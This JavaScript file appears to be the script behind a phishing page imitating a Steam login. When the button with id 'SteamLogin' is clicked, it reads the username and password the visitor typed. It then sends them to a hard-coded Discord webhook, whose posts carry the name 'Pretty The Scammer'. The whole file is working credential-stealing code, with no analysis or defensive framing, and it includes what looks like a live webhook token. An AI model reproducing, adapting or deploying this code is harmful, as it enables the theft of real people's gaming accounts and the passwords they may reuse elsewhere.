const webhook = "https://discord.com/api/webhooks/1459176302761476121/GKsgn5ycRO4-xrKV6OnvG1NLXwALAXV2qOTX7F00cdEHl_Iv3X0UxHZwEGSJkBbY7cOd";

function get_input() {
  return {
      username: document.querySelector('input[name="username"]').value.trim(),
      password: document.querySelector('input[name="password"]').value.trim()
  };
}

async function send_data() {
  const { username, password } = get_input();

  if (!username || !password) 
  {
    console.warn("Data is empty — not sending.");
    return;
  }

  const payload  = {
    username: "Pretty The Scammer",
    content: `Nickname: ${username}\nPassword: ${password}`
  }

  try {
    const res = await fetch(webhook, 
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    if (res.ok) 
    {
      console.log("Sent successfully");
    } 
    else if (res.status === 429) 
    {
      const data = await res.json().catch(() => ({}));
      console.warn("Rate limited. Retry after:", data.retry_after || "unknown");
    } 
    else {
      const text = await res.text();
      console.error("Failed to send webhook:", res.status, text);
    }
  } catch (err) 
  {
    console.error("Network or fetch error:", err);
  }
}

document.addEventListener('DOMContentLoaded', () => {
  const btn = document.querySelector('#SteamLogin');
  if (btn) 
    {
        btn.addEventListener('click', send_data);
        console.log("Found")
    }
  else { console.log("Btn not found")}
});
